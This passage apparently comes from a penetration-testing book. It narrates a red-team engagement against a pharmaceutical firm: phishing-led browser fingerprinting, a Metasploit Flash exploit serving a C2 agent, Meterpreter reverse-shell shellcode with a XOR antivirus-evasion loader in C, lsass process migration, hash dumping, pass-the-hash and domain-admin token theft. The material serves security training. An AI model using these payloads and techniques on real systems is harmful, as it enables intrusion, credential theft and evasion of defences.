shall see, this faith will turn\nout to be horribly misplaced.\nThe scope of the engagement would be a short-term hunter-killer exercise\nwith the following goals:\nSimulate an attack against company employees by harvesting information\nincluding confidential data such as home addresses and social security\nnumbers.\nSimulate a tertiary attack by acquiring names and details of suppliers and\nclients.\nDetermine a scenario where an attacker could cause irreparable or at least\ncritical damage to the company through an attack on computer resources\nand information systems.\nThis made for a simple plan, at least on paper. We'd likely need to gain access\nto HR systems at a minimum, but it would be better if you could escalate\nprivileges across as much of the network as possible, including backup\nsystems. That way, you could simulate a massive destructive incident. Once\nan attacker has gained access to substantial resources, the quickest way to\nrender them unusable would be to boot encrypt the hard storage and\nincapacitate the backups. In a genuine attack, an external actor would alter\nthe parameters of the backups in order to overwrite the backups with garbage.\nBackup tapes (yes, they're still used in a lot of places but this works for\nequivalent technologies too), for instance, are usually reused every couple of\nweeks. With the all data destroyed, an attack on the infrastructure will be\nterminal.\nPayload Delivery Part IV: Client-Side Exploits 1\nIn this chapter, we look at delivering payloads by exploiting vulnerabilities in\nclient-side software such as web browsers, their plugins, and other desktop\ncode. New vulnerabilities are discovered and patched in applications every day\nand, as a consequence, there is little point in learning to attack specific bugs\nhere, as these will have been long addressed before this book goes to print.\nThat being said, there are the “usual suspects”—technologies in which serious\nbugs have been discovered on a seemingly weekly basis over the course of\ntheir long lives and as such are illustrative and interesting to explore.\nThe Curse That Is Flash\nThe worst offender is Adobe Flash. Its almost universal presence combined\nwith a long history of terrible security means that it is a staple of exploitation\nkits, ransomware, and drive-by-downloads. There is no secure way to deploy\nthis horror story of a plugin—disable or remove it. The vast majority of\nsystems will have Flash, and it is important to have some exploits for it on\nhand. There are so many security updates to Adobe Flash that most users\n(corporate or otherwise) just don't bother (unless there is a corporate\ntechnical policy in place to do this automatically, in which case such a security\nconscious environment will likely have marked it as a banned technology\nanyway). Antivirus is good at blocking the generic Flash exploits that emerge\nin tools like Metasploit, but as with any malware, a few small changes can\nensure an attack slips through the defenses while remaining effective. Figures\n4.1 and 4.2 should provide food for thought.\nFigure 4.1: This image from cvedetails shows 56 code execution\nvulnerabilities in Flash in 2016 alone.\nFigure 4.2: The number one issue on this AlienVault SOC alarm screen is\nvulnerable software, with that software being Flash.\nAt Least You Can Live Without It\nThe one redeeming quality of Flash from a security perspective is that it\ndoesn't really do anything useful (at least nothing that is not now served by\nHTML5), so if you want to go ahead and pull it out of your network by the\nroots, the walls aren't going to come tumbling down. The second big offender\nis Java. You saw earlier that it's easy to whip together a Java applet to carry\nout specific attacks against the client, which is great if that vector works for\nyou. However, like Flash, certain versions are vulnerable to attacks that will\ntake those decisions out of the target's hands as soon as they visit a website\nthat contains your exploit. There are nowhere near as many vulnerabilities in\nJava as there are in Flash; nevertheless, it is still the second most commonly\noccurring issue detected in the same AlienVault SOC, as shown in Figure 4.3.\nFigure 4.3: This is clearly a large network that lacks a cohesive overall\nvulnerability management strategy.\nMemory Corruption Bugs: Dos and Don'ts\nWe'll look at a sample attack against Flash in due course, but first a comment\non workflow. Personally, I don't like using memory corruption bugs when\nattempting to gain entry into target systems. By the nature of these\nvulnerabilities, there can be a lot of uncertainty and a lot that can go wrong.\nWhen targeting a massive number of users in a phishing attack, that can be\nacceptable, but in a specific APT-modeling scenario, every failed attack will\ncause the target to become more aware and more suspicious. Consequently,\nyou have to remove as much uncertainty as possible, so when exploiting such\nvulnerabilities, it is desirable to have as much information on what the client\nis running beforehand, both in terms of an attack surface as well the specific\nversions of the software. It is possible to set up a webserver and give it a\ncertain amount of intelligence to detect vulnerabilities in browsers and exploit\nthem in real-time depending on what is found. However, this is rarely\npractical in real-world attacks against corporate infrastructure and they tend\nto be “loud” (suspicious to IDS) and slow (the target may leave the web page\nor close the browser before an appropriate exploit is selected and exploited).\nOur process therefore should look like this:\nProfile the target—Lead your victim to a website that will run some scripts\nand model the environment.\nExploit selection—Determine what is applicable to the target.\nStealth—Modify the exploit to ensure that it won't be triggered by\nsignature-based IDS but will still run. Being able to model your target's\nenvironment as closely as possible in a virtualized environment is\nessential here. This is the same issue you always face when deploying\npayloads and the nature of the obfuscation is going to depend on the\nattack.\nExploitation—Deliver the attack in a plausible way to bring it under your\ncommand and control.\nAssuming that you're targeting a user via a web browser, there are a couple of\noptions for determining client-side software. The best option is JavaScript.\nThe following quick and dirty script demonstrates how to enumerate browser\nplugins and versions:\n<html>\n<head>\n<script type=\"text/javascript\">\n<!--\nfunction showWindow(){\nvar len = navigator.plugins.length;\nnewWin = window.open(\"\", \"\", \"height=400,width=500\");\nnewWin.document.write(\"<p>Plug-In Info:</p>\");\nfor(var i = 0; i < len; i++){\nnewWin.document.write(\"<li>\" +\nnavigator.plugins[i].description + \"</li>\");\n}\nnewWin.document.close()\n}\n//-->\n</script>\n</head>\n<body>\n<form>\n<input type=\"button\" value=\"Show Plug-In Information\"\nonclick=\"showWindow()\">\n</form>\n</body>\n</html>\nThis method has its pros and cons. It's JavaScript so will most likely be\nallowed to run, but on the other hand, JavaScript doesn't have access to the\nclient's file system so it's dependent on what the browser chooses to tell it.\nThe output is messy and usually contains duplicates, as shown in Figure 4.4.\nFigure 4.4: Script output shows plugin data.\nThere are other properties and values you can derive via HTML/JavaScript,\nbut if you want to go any deeper, you're going to need something more\npowerful running in the browser such as Java. That presents its own problems\nas you've already seen. Additionally, if you can execute Java applets on a\ntarget system you're already in a strong position to deploy your C2 without\nfurther fuss. In any case, JavaScript is adequate for what is needed here.\nReeling in the Target\nGetting your target to visit your profiling web page is a matter of social\nengineering and you have many options. A favorite of mine is to use a fake\nLinkedIn invite. We all get them from people we know and people we don't, so\nthey make for a good “click-and-forget” attack. A LinkedIn invite in your inbox\nlooks like Figure 4.5.\nFigure 4.5: A LinkedIn invite comes as an HTML email message.\nIt looks innocent enough but you can turn this into an effective attack by\ndownloading the HTML and modifying the URLs in the message. That way,\ninstead of going to LinkedIn, any click will redirect the target to the profiling\nweb page. If you add the following line of code to the end of the JavaScript:\nwindow.location.href = \"https://www.linkedin.com/error_pages/\"\nThe user will be immediately shown a temporary LinkedIn error message. The\nJavaScript is not stealthy and will not stand up to careful examination;\nhowever, we cover JavaScript obfuscation in depth later in the book.\nLooking at the output from a profiler, you can see that the client is running\nFlash version 18.0.0.203. Checking CVE details, again you find that this\nversion is vulnerable to the exploit CVE-2015-5122, as shown in Figure 4.6.\nFigure 4.6: This is a remote command execution bug with reliable exploit\ncode in the wild.\nThis exploit is quite interesting. It was discovered by a loathsome company in\nItaly called Hacking Team who specialized in selling spyware to repressive\nregimes (until the Italian government revoked their license to export\nsoftware). After Hacking Team was itself compromised by parties unknown, a\nlot of its secrets and some of its exploit code (including this one) was leaked\nto the Internet. It was improved by the community and imported into the\nMetasploit framework. (See\nhttps://www.rapid7.com/db/modules/exploit/multi/browser/adobe_flash_hacking_team_uaf\nThis is tooling that we'll integrate into our C2 in the next section. For now,\nwe'll use a standalone Metasploit exploit for the CVE-2015-5122 bug to get\ncode execution on the target and install our C2 agent. If you're not familiar\nwith Metasploit, now would be a good time to get familiar. There are plenty of\ntutorials on the web and it's too useful a tool for APT modeling to disregard.\nSetting up this attack is simplicity itself:\nroot@37-97-139-116:~# msfconsole\nmsf > search 5122\nMatching Modules\n================\nName Disclosure Date Rank Description\n----- --------------- ----- ---------------\n-\nexploit/multi/browser/adobe_flash_opaque_background_uaf 2015-07-\n06 great Adobe Flash opaqueBackground Use After Free\nmsf > use exploit/multi/browser/adobe_flash_opaque_background_uaf\nmsf exploit(adobe_flash_opaque_background_uaf) > set PAYLOAD\ngeneric/custom\nPAYLOAD => generic/custom\nmsf exploit(adobe_flash_opaque_background_uaf) > set PAYLOADFILE\nc2_agent.exe\nPAYLOADFILE => c2_agent.exe\nmsf exploit(adobe_flash_opaque_background_uaf) > set SRVPORT 80\nSRVPORT => 80\nmsf exploit(adobe_flash_opaque_background_uaf) > set URIPATH\nadobe_demo\nWith a few simple commands, this attack is ready to fly. The end result is a\nweb server that, when visited by the target, will immediately attack the\nvulnerable version of Flash. If it's successful, it will upload and execute the C2\nagent.\nThe exploit is enabled as follows:\nmsf exploit(adobe_flash_opaque_background_uaf) > run\n[*] Exploit running as background job.\nmsf exploit(adobe_flash_opaque_background_uaf) >\n[*] Using URL: http://0.0.0.0/adobe_demo\n[*] Local IP: http://c2_server.com/adobe_demo\n[*] Server started.\nAnyone visiting the URL http://c2server.com/adobe_demo is going to get\nattacked and anyone running a vulnerable version of Flash is going to get\nowned. This is a nice reliable exploit and a good intro to Metasploit if you\ndon't know it. It's also resilient to antivirus (as long as you don't call it\nFlashExploit or some other obvious keyword that will get you flagged), as\nshown in Figure 4.7.\nFigure 4.7: Metasploit does an excellent job at obfuscating the CVE-2015-\n5012 attack.\nCommand and Control Part IV: Metasploit Integration\nI didn't want this to be “Just Another Book On Metasploit ©”. However, the\nframework is too useful to simply disregard and, if used correctly, it can solve\nand streamline a lot of the problems in the APT-modeling scenario. There are\ntwo versions of Metasploit—the free version which is completely adequate for\nour needs and the paid version, Metasploit Pro, which is a commercial\nproduct owned by Rapid 7. There's nothing inherently wrong with the\ncommercial version, so feel free to give it a whirl.\nNOTE\nThere are numerous (excessive even) resources to learn Metasploit. This\nis not one of them. A working understanding of Metasploit concepts,\ncommands, and exploits is assumed. Here you are primarily concerned\nwith bringing the functionality and flexibility of the framework into your\nown C2.\nMetasploit Integration Basics\nTo integrate Metasploit into your C2, you need the following:\nA Metasploit listener running on your C2 infrastructure. This is a matter\nof taste but in this example we're going to go with a TCP reverse\nconnection listening on port 1234 on the localhost interface only.\nAn AV-resilient Meterpreter client you can deploy via your SSH\nconnection. Create a custom encoded payload that you will further harden\nand deliver as a small C application.\nThe ability to route over your SSH connection so you can consolidate\ncomms over a single connection and defeat Intrusion Detection\nMonitoring of network traffic. Ideally, you would use SSH dynamic\nconnection tunneling, which would allow you to start a SOCKS proxy on\nour target machine and route all Metasploit traffic through it back to the\nC2. However, Metasploit doesn't allow you to specify proxy settings when\ngenerating shellcode, so you will use a simple reverse SSH tunnel with the\nMetasploit listener itself restricted to localhost and not exposed and open\nto the Internet.\nServer Configuration\nServer configuration is simply a matter of installing Metasploit and its\ndependencies. If you're using a Linux distribution geared toward penetration\ntesting, this will all be in the repository. Otherwise, download and install it\nmanually. You will definitely want to install PostgreSQL and ensure that that\nis playing well with Metasploit; however, this is all documented in detail\nelsewhere and I will not waste space here with trivialities.\nBlack Hats/White Hats\nMetasploit is a widely used tool by both pen testers and miscreants and one\nthat has seen considerable exposure to malware analysis, so to create an AV\nresilient payload is a two-step process. We will first need to generate the flat\nshellcode that will talk back to our C2 (our Meterpreter payload) and then you\nembed that in an encoded format and inject it straight into memory at\nruntime. So:\n~# msfvenom -p windows/meterpreter/reverse_tcp lhost=localhost\nlport=1234 -e x86/shikata_ga_nai -i 3 -f c\nNo platform was selected, choosing Msf::Module::Platform::Windows\nfrom the payload\nNo Arch selected, selecting Arch: x86 from the payload\nFound 1 compatible encoders\nAttempting to encode payload with 3 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 357 (iteration=0)\nx86/shikata_ga_nai succeeded with size 384 (iteration=1)\nx86/shikata_ga_nai succeeded with size 411 (iteration=2)\nx86/shikata_ga_nai chosen with final size 411\nPayload size: 411 bytes\nunsigned char buf[] =\n\"\\xdb\\xde\\xd9\\x74\\x24\\xf4\\xb8\\x69\\x68\\x4d\\x1a\\x5a\\x2b\\xc9\\xb1\"\n\"\\x61\\x31\\x42\\x17\\x03\\x42\\x17\\x83\\x83\\x94\\xaf\\xef\\x88\\xa7\\x8a\"\n\"\\x86\\x6c\\x94\\x77\\x7f\\x04\\xc0\\x73\\xde\\xcf\\xc1\\xcd\\x85\\x8c\\x14\"\n\"\\x29\\x0b\\xc4\\x8c\\x31\\x3d\\x6a\\x0c\\x7c\\x84\\x0b\\xb0\\xb9\\x54\\x4a\"\n\"\\xe9\\x53\\x0b\\x9d\\x2e\\x1f\\xe9\\x16\\xe7\\x8b\\x56\\x26\\x44\\x04\\x56\"\n\"\\xbf\\xea\\x91\\xa3\\x68\\x47\\xea\\x6c\\x4d\\xbe\\xa6\\xa9\\x32\\x64\\x1d\"\n\"\\xb7\\x97\\x83\\x44\\xac\\xe4\\xe5\\x63\\xb9\\xe2\\xb0\\xc2\\x3a\\x55\\x4f\"\n\"\\x88\\x07\\x29\\x74\\xfb\\xe7\\xcc\\x5c\\x91\\xe8\\x76\\x93\\x0b\\xb9\\x36\"\n\"\\xb7\\x50\\x90\\x04\\xbf\\xe5\\xe1\\xaf\\x8d\\x81\\x38\\xd3\\x66\\xb2\\x20\"\n\"\\xf3\\xc3\\xca\\xa7\\x02\\xf8\\x6d\\x73\\x39\\x99\\x0b\\x6e\\xc1\\x5b\\xaf\"\n\"\\x21\\xc0\\x3a\\xe1\\x38\\x47\\x18\\xe3\\x5e\\x5b\\x41\\x7b\\x8e\\x35\\x60\"\n\"\\xf9\\x8e\\xad\\xc2\\x97\\x82\\x1a\\x1f\\x05\\x67\\x88\\x49\\x48\\xb7\\xfa\"\n\"\\xf4\\xcc\\x33\\xfd\\xed\\xdb\\x6f\\xac\\xe4\\x04\\x28\\xc2\\x32\\x54\\x47\"\n\"\\xa2\\x2d\\x85\\x76\\x1a\\xd3\\x72\\xc0\\x9d\\x0d\\x13\\xad\\xb0\\x97\\x01\"\n\"\\x25\\x88\\x25\\x64\\xf7\\x54\\x55\\x0a\\x35\\x55\\x2a\\x1f\\x3a\\xb9\\x5f\"\n\"\\xa1\\x5f\\x4d\\x57\\xfa\\xd0\\x56\\x24\\xe5\\x2f\\x55\\xf9\\x2f\\xdf\\x2c\"\n\"\\x50\\x59\\xe6\\xbb\\xb1\\x18\\x42\\xfa\\x2d\\xad\\x76\\xf4\\xe6\\x3e\\x47\"\n\"\\xff\\x05\\x9f\\x19\\x71\\x8a\\xbd\\x76\\xd8\\x24\\x0d\\x89\\xf2\\x16\\xf3\"\n\"\\x89\\x85\\x8d\\x2e\\x05\\x63\\xda\\x1f\\xaf\\x40\\x89\\xa5\\x48\\x42\\x83\"\n\"\\xc2\\xf9\\xee\\xa4\\x11\\x0b\\x36\\xef\\x7b\\xb1\\x10\\x09\\xf2\\x5b\\x1c\"\n\"\\x24\\x42\\x41\\x26\\x76\\x00\\x02\\xe6\\x8f\\xae\\x01\\x4a\\x45\\x95\\xf9\"\n\"\\x7d\\x78\\x0d\\x94\\xd5\\x21\\xa4\\xf3\\x32\\x95\\x60\\x3a\\xfa\\x6b\\x67\"\n\"\\x49\\x4d\\x47\\x13\\x0c\\x81\\x71\\xfe\\xf4\\x6f\\x37\\xc6\\x70\\xd5\\x51\"\n\"\\xaa\\x50\\x74\\x80\\xad\\x0f\\x30\\xf5\\x4f\\x2b\\x60\\xa0\\x0c\\x6f\\x4c\"\n\"\\x13\\x99\\x39\\x44\\xaa\\x22\\x78\\xe8\\xa2\\x54\\x5c\\x8f\\x66\\x6e\\x7c\"\n\"\\xde\\x4d\\x7f\\xd0\\x13\\x4a\\xd3\\x0c\\xf3\\xc5\\xef\\x83\\xda\\x48\\xae\"\n\"\\xeb\\xa9\\xa4\\x3c\\xfb\\x39\\xc2\\x9d\\x4c\\x8d\\x23\\xa7\\x95\\xc8\\x6d\"\n\"\\xc2\\x20\\x1a\\x9e\\x58\\x09\";\nNote that we've given the shellcode three iterations of the\nx86/shikata_ga_nai encoder to avoid AV signature detection, but that likely\nwon't be enough. In order to pass muster, we will first further obfuscate our\nshellcode by XORing it with a simple key (in this case xyz) and then load that\nstring into the following C code and compile it:\n#include <windows.h>\n#include <iostream>\nint main(int argc, char **argv) {\nchar b[] = {/* your XORd with key of 'xyz' shellcode goes here*/};\nchar c[sizeof b];\nfor (int i = 0; i < sizeof b; i++) {c[i] = b[i] ^ 'x';}\nvoid *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT,\nPAGE_EXECUTE_READWRITE);\nmemcpy(exec, c, sizeof c);\n((void(*)())exec)();\n}\nIf you submit the XOR function to Virus Total, you'll get what's shown in\nFigure 4.8.\nFigure 4.8: A simple XOR function can easily defeat antivirus technology.\nWhat Have I Said About AV?\nBy now you have probably learned that relying on AV to protect you from\nanything but the most trivial malware is a very bad idea. At the risk of\nrepeating myself, in an APT scenario where you are being specifically targeted\nby a resourceful and patient attacker, AV is worse than useless, because it\nprovides a false sense of security.\nWhen discussing the use of Metasploit, I will also use the graphical frontend\nArmitage developed by Raphael Mudge. The reason for this is simply that the\nnative Metasploit CLI interface doesn't provide particularly illustrative\nscreenshots.\nWe could add a function to our C2 graphical interface to automate the\ndeployment of the Metasploit agent or just upload and execute it manually.\nMetasploit has its own persistency functionality, but we won't be using it as it\nwill get flagged by IDS. Instead, we'll initialize it from our own C2\ninfrastructure when needed. Our setup with integrated and deployed\nMetasploit now looks like Figure 4.9.\nFigure 4.9: The Meterpreter session is tunneled over SSH and looks\ninnocent to network IDS.\nPivoting\nOne of the most important and useful functions that Metasploit brings to the\nequation is pivoting. This allows us to route attacks through a compromised\nmachine and attack other network resources that it has visibility to. This is a\nstackable feature, meaning we can route through a chain of machines should\nwe need to. This might be necessary for defeating certain kinds of network\naccess control or you might want to stage attacks from a network resource of\nlittle value so that if detected by the SOC you haven't lost your beachhead\naccess. Using Armitage this is a one-click process presented in a slick\ngraphical interface.\nMetasploit also implements a process-migration attack that (among other\nthings) allows you to completely bypass process-based access control. That\nbrings us neatly to the next section.\nThe Attack\nThe client provided a standard corporate Windows 7 imaged workstation,\nalthough we could also plug our own kit into their network. The first order of\nbusiness was to compromise the workstation itself—what we learned here\nwould tell us a lot about how the company handled information security in\ngeneral. There is also the potential to acquire administration credentials that\nmay be useful elsewhere.\nThe Hard Disk Firewall Fail\nThe workstations are running a modified kernel to prevent unauthorized\nprocesses from writing to the disk. This technology is easy to bypass and it's\nthe first thing we need to get around before we can attack the workstation in\nearnest.\nThe HDF doesn't stop us from running code; it only prevents disk writes by\nunauthorized processes. Therefore our attack will need to migrate to another\nauthorized process in order to get around this. Having write access to the hard\ndrive will make privilege escalation attacks much easier (see Figure 4.10).\nFigure 4.10: Notepad cannot write to the C drive. It's a fair bet most desktop\nsoftware programs have the same restrictions.\nMetasploit Demonstration\nThe quickest way to achieve this (and indeed to set up the workstation attack)\nis to use Metasploit. By deploying a Meterpreter payload into memory, we can\nlist processes and migrate between them with the click of a mouse. In this\nexample, we will list the processes running on the host to learn the PID\n(process ID) of the lsass.exe core Windows process and jump into it. See\nFigures 4.11 and 4.12.\nFigure 4.11: Armitage displays a list of plugins and their owners.\nFigure 4.12: Process migration is a one-click process. Here we have migrated\ninto lsass.exe.\nWith our payload running in the lsass.exe process, we can use Metasploit to\nwrite to whatever we want, as shown in Figure 4.13.\nFigure 4.13: In this example test.txt is uploaded from the attacker\nworkstation.\nUnder the Hood\nIf you're interested in what is actually happening here, Metasploit is doing the\nfollowing:\nGetting the PID the user wants to migrate into. This is the target process.\nChecking the architecture of the target process whether it is 32-bit or 64-\nbit. This is important for memory alignment but Metasploit can migrate\nbetween 32-bit and 64-bit processes.\nChecking if the meterpreter process has the SeDebugPrivilege. This is\nused to get a handle to the target process.\nGetting payload from the handler that is going to be injected into the\ntarget process. Calculating its length as well.\nCalling the OpenProcess() API to gain access to the virtual memory of the\ntarget process.\nCalling the VirtualAllocEx() API to allocate an RWX (Read, Write,\nExecute) memory in the target process.\nCalling the WriteProcessMemory() API to write the payload in the target\nmemory virtual memory space.\nCalling the CreateRemoteThread() API to execute the newly created\nmemory stub having the injected payload in a new thread.\nTerminating the initial Meterpreter process.\nProcess migration is useful in other scenarios as well. Had we exploited a\ntarget using an Adobe PDF exploit, for example, we would lose our shell the\nmoment the target closed Adobe, and by migrating we can avoid that.\nNow that we can write to the local storage, we can go persistent (survive\nreboots) by installing a C2 agent to bring the workstation under our command\nand control; however, this is not strictly speaking necessary given that in this\ncase the testing is entirely internal. Also, it's generally a good idea to do this as\nan administrative user rather than a humble user so that if you want to run\ncommands via C2 later, you can do so with admin privileges.\nWe will cover the concepts and techniques in privilege escalation in detail in\nthe next chapter. However, a simple local privilege escalation bug is all that is\nneeded here to give us administrative rights and access to useful data like\npassword hashes that can potentially be used to expand our influence over the\nrest of the network.\nThe attack we'll use is the Bypass UAC protection Bypass VBS attack, as\nshown in Figure 4.14.\nFigure 4.14: Exploiting a vulnerability in the ScriptHost to escalate to the\nsystem.\nThis attacks works flawlessly against the Windows 7 build under attack\n(7601).\nThe Benefits of Admin\nNow that we have compromised this machine to the administrator level, we\nwill install the C2 agent and dump the password hashes for the local users.\nWhile we already have unrestricted access to this workstation, they may be\nuseful elsewhere, particularly as a lot of organizations use one specific local\nadmin account for tech support and then push software to the desktop. If we\nwere able to obtain them, then lateral movement across the enterprise will\nbecome a lot easier.\nIn organizations that are using NTLM authentication (which in Windows\nshops is pretty much everyone), assuming that such an account existed, we\nwouldn't need to crack its hash to use it, as there is an attack called “Pass the\nHash” where simply having possession of the password hash is sufficient to\nuse it to log in into other hosts on the network. More on that shortly. In the\nmeantime, I like to have the passwords and consider cracking them a worthy\nexercise. There are many tools and techniques you can use for password\ncracking—I like John the Ripper, but it's one of many. This is another time\nwhere process migration is usual. We can migrate into the lsass.exe process\nand dump cached hashes without touching the disk, which is another example\nof the futility of so-called hard disk firewalls.\npentestuser:502:E52CAC67419A9A224A3B108F3FA6CB6D:047310f22e642465092c42b4ef84490b:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\npharmadmin:500:047310f22e642465092c42b4ef84490b:ecbbacc2fcaf2e07045b500d2a57ed4a:::\nNow would be a good time to dump all the hosts from the Active Directory.\nAD isn't going to contain everything, but it's a good bet that all the systems\nthat are part of the forest/domain infrastructure will be registered there.\nThat's at least all workstations and servers Windows XP/2000 onward. The\nquickest and easiest way to do this is with the PowerView script we looked at\nearlier in the book:\nC:> powershell.exe -nop -exec bypass\nPS C:\\> Import-Module ./powerview.ps1\nPS C:\\> Get-NetComputers | Out-File -Encoding ascii output.txt\nThis isn't a comprehensive audit of the entire network infrastructure. The\ndump won't contain *nix boxes, routers, switches, embedded devices, etc., but\nit's an excellent starting point for getting a feel for what the network looks\nlike.\nHowever, if we dump the list of Windows domains, we can see that the\ninfrastructure is also divided up by country:\nC:> powershell.exe -nop -exec bypass\nPS C:\\> Import-Module ./powerview.ps1\nPS C:\\> Get-NetDomain | Out-File -Encoding ascii domains.txt\nUK\nGER\nAU\nFR\nDK\nIT\nINX\nNL\nIN\nWIB\nRD\nESP\nWe can also list hosts specific to each particular domain:\n<snipped for brevity>\nUK Hosts\nUKDC01.uk.pharma.com\nukmail01.uk.pharma.com\npharmUK24.uk.pharma.com\npharmUK23.uk.pharma.com\npharmUK04.uk.pharma.com\npharmUK112.uk.pharma.com\nUKSQL02.uk.pharma.com\npharmUK13.uk.pharma.com\npharmUK14.uk.pharma.com\npharmUK10.uk.pharma.com\nuksql01.uk.pharma.com\npharmUK80.uk.pharma.com\npharmUK110.uk.pharma.com\npharmUK17.uk.pharma.com\npharmUK123.uk.pharma.com\nukutil01.uk.pharma.com\nukmail02.uk.pharma.com\neuportal.uk.pharma.com\nIT Hosts\npharmITLT03.it.pharma.com\nnasd15b10.it.pharma.com\nitdc01.it.pharma.com\nITTERM02.it.pharma.com\nitdc02.it.pharma.com\nitutil01.it.pharma.com\nitterm01.it.pharma.com\nitnas01.it.pharma.com\nitsql02.it.pharma.com\nitnas02.it.pharma.com\nitmail01.it.pharma.com\nITSQL01.it.pharma.com\npharmIT21.it.pharma.com\npharmit52.it.pharma.com\npharmit57.it.pharma.com\npharmit53.it.pharma.com\npharmIT55.it.pharma.com\npharmIT23.it.pharma.com\npharmIT24.it.pharma.com\npharmIT02.it.pharma.com\nI don't recommend mapping the network in any formal way, as this is going to\ngenerate a lot of ICMP and SNMP traffic at a minimum, which is loud and\nunnecessary. We want to stay under the radar and we have all the data we\nneed to make informed decisions about what to attack next.\nTo get the populated network ranges, it's necessary to first convert the\nhostnames to IP addresses. This is a quick and dirty PowerShell script to do\njust that:\nforeach ($computer in (get-content C:\\hosts.txt)) {\nTry{\n[system.net.Dns]::GetHostAddresses($computer) | Foreach-Object {\nadd-content -path C:\\hosts-ips.txt -value\n\"$($_.IPAddressToString)\"\n}\n} Catch {\n}\n}\nBy cross-referencing this output, it becomes apparent that the architecture is\ndivided into two main IP ranges. The first is 192.168.0, which is divided in /24\nblocks by country.\n192.168.0.0/24 CN=UK\n192.168.45.0/24 CN=GER\n192.168.10.0/24 CN=AU\n192.168.75.0/24 CN=FR\n192.168.55.0/24 CN=DK\n192.168.65.0/24 CN=IT\n192.168.85.0/24 CN=NL\n192.168.15.0/24 CN=IN\n192.168.30.0/24 CN=WIB\n192.168.12.0/24 CN=RD\n192.168.40.0/24 CN=ESP\n192.168.0.0/16 CN=US\nTypical Subnet Cloning\nGiven these domain specific hosts, each of these ranges appears to be loosely\ncloned from a template with the same host-naming nomenclature. Each\ncountry has its own domain controllers, mail server, file server, and\nworkstations. The exception to this is 190.168.0.0, which appears to be\nconfigured as one massive /16 relating solely to hosts in North America. This\nis a major deviation from internal network design standards and it's unclear\nwhy this has been implemented in this way, given the company's history\noriginating in Europe.\nI would speculate that the American network segment was “bolted on”\nafterward and never properly migrated. That sort of thing happens fairly\nfrequently. The important thing now is that we know there are multiple\ndomains, we know how they're configured, and we know that they are likely\nmanaged locally with different local domain accounts and with an overlapping\ntrust model. We can plan our attack now with some precision.\nRecovering Passwords\nAssuming that we couldn't decrypt the password hashes we recovered from\nthe local test hosts (at least within a reasonable time frame using a dictionary\nattack, brute force, and rainbow tables), all is not lost. There is a well-\ndocumented attack within the Windows operating system where you can\nauthenticate remotely to another host using only the encrypted hash, without\nhaving to know the plaintext (as is obviously normally the case). The attack\nexploits an implementation weakness in the authentication protocol in that\nthe password hashes are not salted, and therefore remain static from session\nto session until the password is next changed. Ergo, if one administrative\naccount on one workstation has the same password as the administrative\npassword on a machine we're trying to access, we don't need to know the\npassword, we only need to be in possession of the hash.\nUsing Metasploit makes this pretty simple. As you've already seen, Metasploit\nstores any hashes its able to acquire for later use. All we need to do to reuse a\nhash is add a target machine into the Armitage interface, right-click it, and\nselect psexec, as shown in Figure 4.15.\nFigure 4.15: Armitage makes a lot of tedious tasks a one-click affair.\nMetasploit output confirms a successful attack:\nSMBDomain => ITPHARMA23\nSMBPass =>\naad3b435b51404eeaad3b435b51404ee:ecbbacc2fcaf2e07045b500d2a57ed4a\nSMBUser => pharmaadmin\n[*] Exploit running as background job.\n[*] Connecting to the server…\n[*] Authenticating to 192.168.68.69:445|ITPHARMA23 as user\n'pharmaadmin'…\n[*] Selecting PowerShell target\n[*] 192.168.68.69:445 - Executing the payload…\n[+] 192.168.68.69:445 - Service started!\nThis gives us local administrator control over the target system (which is\ngreat!), but what would be even better is to have domain administration\ncredentials. This would allow us to walk over the entire network. There's a\ntrick to doing this if you can find a workstation or server that a domain\nadministrator is logged into and that you can get local administrator access to.\nLuckily, with PowerView, this is a snap. First of all, we need to enumerate the\ndomain admins:\nPS C:\\> Invoke-StealthUserhunter -GroupName \"Domain Admins\"\nUserDomain : it.pharma.com\nUsername : globaladmin\nComputerName : itmail01.it.pharma.com\nIP : 192.168.65.11\nSessionFrom : 190.168.96.21\nLocalAdmin :\nUserDomain : it.pharma.com\nUserName : globaladmin\nComputerName : itmail01.it.pharma.com\nIP : 192.168.65.11\nSessionFrom : 192.168.0.99\nLocalAdmin :\nUserDomain : it.pharma.com\nUserName : globaladmin\nComputerName : itterm01.it.pharma.com\nIP : 192.168.65.13\nSessionFrom : 192.168.0.99\nLocalAdmin :\nUserDomain : it.pharma.com\nUsername : globaladmin\nComputerName : itdc02.it.pharma.com\nIP : 192.168.65.32\nSessionFrom : 192.168.0.99\nLocalAdmin :\nUserDomain : it.pharma.com\nUserName : globaladmin\nComputerName : itdc01.it.pharma.com\nIP : 192.168.65.10\nSessionFrom : 192.168.0.99\nLocalAdmin :\nUserDomain : it.pharma.com\nUserName : globaladmin\nComputerName : itsql02.it.pharma.com\nIP : 192.168.65.63\nSessionFrom : 192.168.0.99\nLocalAdmin :\nUserDomain : it.pharma.com\nUserName : globaladmin\nComputerName : ITSQL01.it.pharma.com\nIP : 192.168.65.12\nSessionFrom : 192.168.0.99\nLocalAdmin :\nIn this example, PowerView uses native Windows API commands to get the\nlogged on users for domain machines.\nIt seems that ITSQL01.it.pharma.com has a domain admin called globaladmin\nlogged into it. Once again, we will use a local admin “Pass the Hash” attack to\ncompromise the host and then get Metasploit to list any available tokens on\nthat host:\nmeterpreter> getuid\nServer username: IT\\pharmaadmin\nmeterpreter > use incognito\nLoading extension incognito…success.\nmeterpreter > getuid\nmeterpreter > list_tokens -u\nDelegation Tokens Available\n========================================\nNT AUTHORITY\\LOCAL SERVICE\nNT AUTHORITY\\NETWORK SERVICE\nNT AUTHORITY\\SYSTEM\nIT\\pharmaadmin\nPHARMA\\globaladmin\nWe can steal the domain admin's session token, which will give us complete\ncontrol of all this domain's hosts.\nmeterpreter > impersonate_token PHARMA\\globaladmin\n[+] Delegation token available\n[+] Successfully impersonated user PHARMA\\globaladmin\nmeterpreter > getuid\nServer username: PHARMA\\globaladmin\nMaking a Shopping List\nAll right. Let's go shopping. Our primary target is still employee data but,\ngiven our highly elevated access, we owe it to ourselves not to miss an\nopportunity for a potentially massive data theft. The last thing we want to do\nat this stage is start creating individual shell sessions on hosts across our\ncompromised domain. There are too many systems and it will create\nsuspicious network chatter, but most importantly of all—it's not necessary.\nWhat we want at this stage is a shopping list, a list across the entire domain of\nthe location of interesting files. This can be anything we want, but let's say\nwe're looking specifically for Microsoft Office Excel documents on remote\nhosts. A simple dir command will suffice in this case:\ndir 